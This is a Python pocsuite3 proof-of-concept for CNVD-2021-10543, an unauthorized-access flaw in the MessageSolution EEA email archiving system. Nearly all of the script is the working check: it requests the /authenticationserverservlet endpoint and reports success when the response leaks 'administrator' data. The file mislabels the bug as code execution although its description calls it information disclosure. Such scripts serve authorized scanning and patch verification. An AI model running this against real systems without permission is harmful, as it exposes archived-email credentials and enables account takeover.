from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
class DemoPOC(POCBase):
    vulID = 'CNVD-2021-10543'  # ssvid
    version = '1.0'
    name = 'MessageSolution企业邮件归档管理系统EEA存在信息泄露漏洞'
    appName = 'MessageSolution'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''MessageSolution 是一套企业邮件归档管理系统。其 authenticationserverservlet 接口存在未授权访问漏洞，攻击者可直接访问该接口获取敏感信息，进而登录系统。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/authenticationserverservlet"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "administrator" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return


    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)